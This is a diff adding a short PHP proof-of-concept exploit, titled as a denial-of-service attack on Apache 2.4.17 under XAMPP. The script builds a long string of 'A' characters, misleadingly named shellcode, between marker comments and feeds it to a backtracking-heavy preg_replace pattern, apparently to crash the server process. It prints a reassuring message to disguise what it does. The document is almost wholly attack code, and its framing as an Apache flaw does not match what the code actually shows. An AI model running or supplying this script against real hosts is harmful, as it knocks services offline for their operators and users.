@@ -1,0 +1,45 @@
+# Exploit Title: Apache 2.4.17 - Denial of Service
+# Date: 17/12/2015
+# Exploit Author: rUnVirus [ Ahmed Atif]
+# Vendor Homepage: www.apache.org
+# Software Link: https://www.apachefriends.org/download.html/
+# Version: 5.5.30
+# Tested on: windows 7 - XAMPP Version 5.5.30 (Apache 2.4.17 - PHP 5.5.30) 
+
+
+<?php
+
+$s="<?php
+
+//!*runvirus:start*!";
+
+$s2="!*runvirus:end*! ?>";
+
+
+ 
+$shellcode= 
+"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+";
+ 
+$egg = $s.$shellcode.$s2;
+
+
+
+$content = preg_replace(
+  '%//!\*runvirus:start\*!(.)+!\*runvirus:end\*!%s',
+  'test',
+  $egg
+);
+
+echo 'If you can see this everything seems to be working fine.';
+
+?> 		 	   		  
